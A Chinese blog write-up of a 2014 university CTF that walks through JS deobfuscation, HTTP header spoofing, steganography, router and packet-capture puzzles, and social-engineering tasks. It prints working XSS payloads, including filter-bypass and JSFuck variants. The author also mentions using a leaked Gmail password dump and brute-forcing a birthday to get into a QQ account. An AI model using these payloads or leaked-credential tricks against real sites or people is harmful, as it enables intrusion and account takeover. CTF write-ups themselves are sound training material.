
弱渣闲来无事玩一玩某石油大学的CTF，写一篇Write-up填充一下博客空白

<!--more -->
<hr/>

#0x00	Base1

第一道题页面啥也没![](http://evilddog.qiniudn.com/base1-1.jpg)，打开源码看到有

```
    <iframe src="css/fool.html" width="0%" height="0%"></iframe>
```

JS代码如下：

```
    eval(function(p,a,c,k,e,d){e=function(c){return(c\\» \\º(){\\¥ \\¹="\\¡同学是个活泼开朗的孩子，在西南石
    油大学各个学院都结交了很多朋友。同时\\¡同学也是一个热心肠，朋友遇到任何困难他都会奋不顾身去鼎力相助。包括追女朋友、
    抓\\¸、写情书、搓背、捡肥皂、帮妹子找回\\·、\\¶帮队友送人头……最近正逢“西南石油大学安全月”，\\¡更是忙的不可开交……
    其实\\¡也是个粗中带细的好学生，其实他一直默默的暗恋着艺术院的一个妹子……";\\¥ \\µ="\\´:\\³"}\',£,£,\'²|±|°|¯|
    ®|­|¬|«|ª|©|¨|¢\'.§(\'|\')))',36,36,'xa1|function|12|xa2|xa3|return|split|passkey|runstr|hack|QQ|LOL
    |key|6f7bf47d9fdf677af6ec611d172fe5a5|da521d85afefa53bc86b41d73c75d081|var|script|running|xa4|xa5|x
    a6|xa7|xa8|xa9|xaa|xab|xac|RegExp|new|replace|if|while|161|fromCharCode|String|eval'.split('|')))
```

把eval换成console.log，如下：

```
    <script>function passkey(){var runstr="running同学是个活泼开朗的孩子，在西南石油大学各个学院都结交了很多朋
    友。同时running同学也是一个热心肠，朋友遇到任何困难他都会奋不顾身去鼎力相助。包括追女朋友、抓hack、写情书、搓背、
    捡肥皂、帮妹子找回QQ、LOL帮队友送人头……最近正逢“西南石油大学安全月”，running更是忙的不可开交……其实running也是个
    粗中带细的好学生，其实他一直默默的暗恋着艺术院的一个妹子……";var key="6f7bf47d9fdf677af6ec611d172fe5a5:da52
    1d85afefa53bc86b41d73c75d081"}</script>
```

貌似是windows hash，解出来是

```
    WEL2014SWPU
```

<hr/>


#0x01	Base2

题目如下![](http://evilddog.qiniudn.com/base3.jpg)那就burpsuite抓包直接修改referer

```
    Referer： http://www.google.com
```

然后神坑地获取了一个64位的瞎JB啥东西：

```
    954a4995de68029c936a5b9eb6a646f50f838b4f8fc851f549fee82add419942
```

直到比赛结束我也不知道咋解开，后来大神们说其实完整的header是这样的：

```
    HTTP/1.1 200 OK
    Date: Sat, 01 Nov 2014 11:01:07 GMT
    Server: Apache/2.2.8 (Win32)
    running: Swp201u4
    Content-Length: 2775
    Connection: close
    Content-Type: text/html
```

注意到running: Swp201u4，然后作为key，用DES作为加密算法进行解密，得到Key

```
    key{It#ReferFrom2014A3$}
```

<hr/>


#0x02  Base3

隐写术这一题

一张郭美美的图片下载下来，用Stegsolve分析可以看到是两张图片一张jpg后面接了一张png，winhex扣下来是张二维码
![](http://evilddog.qiniudn.com/base3-1.jpg)

拖进工具里面一看是某空间网址，进到空间第一条说说就是一段md5，扔到somd5.com里面解开就是key

```
    ITpicT2048re@GMM
```

<hr/>


#0x03 Base4 

XSS第一道题，没啥问题放出payload

```
    "><img src=1 onerror=alert(1)>
```

svg大法好

```
    "><svg/onload=alert(1)>
```

只要让它弹窗就会显示出key，手贱的我顺便 注释掉后面,结果弹了没有key纠结老半天
![](http://evilddog.qiniudn.com/xss1.jpg)

```
    Why are you so diao !!so key=Gre34y_6r3p
```

<hr/>


#0x04 Base5

XSS第二道题，看源码，有个翔一样的函数：

```
    window.onerror=function(){
		return true;
	}

	function blue(){
		if(shit==""){
			var shit=1;
			eval(shit);
		}
	}
	
	blue();
```

还过滤了alert直接闭合掉函数：

```
    "){};var b='al'+'ert()';eval(b);if(shit="
```

毫无悬念：

```
    Why are you so diao!! so key=Ve07G73@edy
```

<hr/>


#0x05 Base6

XSS第三道题,payload：

```
    ''){};var b='al'+'ert(1)';eval(b);if(shit=''
```

结果弹窗就是没有key，直接找客服要![](http://evilddog.qiniudn.com/xss3.jpg)

```
    16otkN03_4$$ly
```

<hr/>


#0x06 Base7

<hr/>


XSS第四道题，表示不会据说有两种方法，一是用unicode的换行符，而是用IE的条件编译来绕过注释 
    
<hr/>


#0x07 Base8

XSS第五道题，过滤了A-Za-z0-9，最后用的[JSfuck](http://www.jsfuck.com/)
Payload:

```
    ''){}[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])
    [!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]
    +!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[]
    [(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!
    +[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[]
    )[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[]
    )[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!
    ![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[
    +[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[
    ]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+
    [])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+
    []]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+
    []]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]
    +[+[]]])(
```

   
<hr/>


#0x08 WebSec 1

土屌表示PHP不熟悉，不会SQL更不会注入

<hr/>


#0x09 WebSec 2

直接更改httpheader，加一个：

```
    X-Forwarded-For: 199.101.117.188
```

然后随便用户名密码，即得key

```
    key:{RunNgIs0g@0dK1d}
```

<hr/>
<br/>

#0x0A WebSec 3-6 CrackMe1-4

统统不会。。。坐等大牛Write-up

<hr/>
<br/>

#0x0B Router 1

![](http://evilddog.qiniudn.com/router1.jpg)

我不会做但我会百度 √


![](http://evilddog.qiniudn.com/router1-1.jpg)
![](http://evilddog.qiniudn.com/router1-2.jpg)

```
    Key=Router_Is_Dangerous
```

<hr/>

#0x0C Router 2

直接抓包，发现有个rar，导出http，发现打开要密码，winhex打开发现结尾有个password:letmein即为解压密码，打开后图片上红果果的写着

```
    KEY=H@vEFun
```

<hr/>


#0x0D Rounter 3 
![](http://evilddog.qiniudn.com/router2.jpg)

我不是大牛但我上乌云 √

![](http://evilddog.qiniudn.com/router3.jpg)

burpsuite新建cookie发包

![](http://evilddog.qiniudn.com/router3-1.jpg)

```
    KEY=Tenda_Router
```

<hr/>


#0x0E Social Engineering 1

分析数据包发现s某个流量特别大的数据段中有两个文件，分别是简历.doc和special.zip

![](http://evilddog.qiniudn.com/se1-1.jpg)
![](http://evilddog.qiniudn.com/se1-2.jpg)

导出之后简历如下：

![](http://evilddog.qiniudn.com/se1-3.jpg)

然后，加了QQ，但是不理我。继续看special.zip，发现要密码找密码，社工题先去社工密码，想起暑假的时候撞库撞出来500万Gmail密码。于是去社工密码：

![](http://evilddog.qiniudn.com/se1-4.jpg)

```
    motianlun
```

解压后得到key

```
    key_1{S02I4L_7!_!na1}
```

<hr/>

#0x0F Social Engineering 2

表示不会做，据说要钓鱼，不大好玩，放弃

<hr/>
<br/>

#0x10 Social Engineering 3 

本来放弃了不想做这石油的题目，后来公选课是在无聊便做了一下，貌似有个key在此人空间里，发现简历和QQ资料上写的都不对，于是在后面的数据包中找到此人油吧的账号，别问辣么多数据包咋找到的，因为公选课实在太无聊，油吧资料写的是金牛座，于是开始穷举，得到此人生日是0510，输入进入空间

![](http://evilddog.qiniudn.com/se3.jpg)


得到key

```
    key_3{Y0u%_c4n_8^r10}
```

<hr/>
<br/>
###本人原创，转载请注明出处
